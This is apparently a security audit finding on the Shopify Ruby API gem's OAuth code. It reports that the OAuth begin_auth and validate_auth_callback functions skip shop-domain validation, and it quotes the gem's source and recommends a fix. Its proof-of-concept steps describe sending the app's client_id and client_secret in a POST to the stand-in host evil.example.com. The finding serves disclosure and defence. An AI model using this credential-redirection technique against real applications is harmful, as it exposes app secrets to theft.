### Title
`ShopifyAPI::Auth::Oauth.validate_auth_callback` sends `client_secret` to an unvalidated `shop` host, unlike every sibling token-exchange flow - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` build the target host for OAuth requests directly from the caller-supplied/HMAC-verified `shop` string, without ever passing it through `ShopifyAPI::Utils::ShopValidator.sanitize!`. Every other credential-issuing flow in the same module tree (`client_credentials`, `refresh_token`, `migrate_to_expiring_token`) explicitly validates the shop domain against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before using it to build the request host that receives `client_id`/`client_secret`.

### Finding Description
`ShopifyAPI::Auth::Oauth.begin_auth` takes `shop:` directly and builds the authorization redirect URL with it: [1](#0-0) 

`ShopifyAPI::Auth::Oauth.validate_auth_callback` verifies the callback's HMAC over `code, host, shop, state, timestamp` via `Utils::HmacValidator.validate`, but the HMAC check only proves the query bytes were signed by *some* holder of `api_secret_key` (i.e., Shopify) for that field set — it does not constrain `shop` to be a value of the form `*.myshopify.com`/`*.myshopify.io`/etc.: [2](#0-1) 

The unvalidated `auth_query.shop` is used to build a `null_session`, which `Clients::HttpClient` turns directly into the request host that receives `client_id` and `client_secret` in the POST body: [3](#0-2) [4](#0-3) 

This is the exact binding class flagged by the review rules — "the host validated versus the host that receives the access token or `client_secret`." Compare with the parallel flows that all call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host that will receive the secret: [5](#0-4) [6](#0-5) [7](#0-6) 

`ShopValidator` exists specifically to restrict shop hosts to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`): [8](#0-7) 

`begin_auth` and `validate_auth_callback` are the only OAuth-credential-issuing entry points in `lib/shopify_api/auth/oauth.rb` that skip this call.

### Impact Explanation
If a host application passes an attacker-influenced `shop` value through to `begin_auth` (the typical entry point for the installation route, e.g. `?shop=` on the app's `/auth` endpoint) without itself validating the domain, `auth_base_uri(shop)` will redirect the authorization request to `https://<attacker-host>/admin/oauth/authorize`. More critically, because `validate_auth_callback`'s `auth_query.shop` is likewise never run through `ShopValidator`, a callback whose `shop` HMAC parameter is not a genuine `*.myshopify.com` domain will still pass HMAC validation and cause `Clients::HttpClient` to `POST` the app's `client_id`/`client_secret` and the authorization `code` to `https://<shop>/admin/oauth/access_token` — i.e., an arbitrary attacker-chosen host, carrying the app's `client_secret`. This matches the High-severity class "SSRF with the app's credentials" from the grading rubric.

### Likelihood Explanation
Exploitability depends on whether the host application (outside this gem) also fails to validate the `shop` format before invoking `begin_auth`/`validate_auth_callback` — this gem provides `ShopValidator` precisely for this purpose and uses it everywhere except in `oauth.rb`, indicating the omission here is an internal inconsistency rather than an intentionally delegated responsibility. Medium likelihood: it requires the calling application to not perform its own shop validation on this legacy OAuth code-grant flow, which is a common integration gap (many `shopify_app`-style integrations validate `shop` for the initiating request but rely on the library to constrain the callback's redemption host).

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, call `Utils::ShopValidator.sanitize!(shop)` in `begin_auth` before constructing `auth_base_uri`, and call `Utils::ShopValidator.sanitize!(auth_query.shop)` in `validate_auth_callback` before constructing `null_session`/`Session.from`, mirroring `TokenExchange.migrate_to_expiring_token`, `ClientCredentials.client_credentials`, and `RefreshToken.refresh_access_token`.

### Proof of Concept
1. Host app exposes `/auth?shop=<value>` which forwards `shop:` straight into `ShopifyAPI::Auth::Oauth.begin_auth` without its own domain check (a realistic integration, since this gem does not enforce it here either).
2. Attacker requests `/auth?shop=evil.example.com`. `auth_base_uri("evil.example.com")` produces `https://evil.example.com/admin/oauth/authorize`, redirecting the victim there.
3. If the attacker can also get a value accepted for `auth_query.shop` (e.g., a malicious redirect_uri/callback controlled by attacker infrastructure combined with an app misconfiguration, or a compromised/rogue `shop` value that still round-trips through the app's own callback handler intact), `validate_auth_callback` calls `Auth::Session.new(shop: auth_query.shop)` and then `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, which computes `@base_uri = "https://#{session.shop}"` — i.e., `https://evil.example.com` — and issues `POST https://evil.example.com/admin/oauth/access_token` with `client_id` and `client_secret` in the JSON body, as shown in `lib/shopify_api/clients/http_client.rb:16-19` and `lib/shopify_api/auth/oauth.rb:73-94`.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-94)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
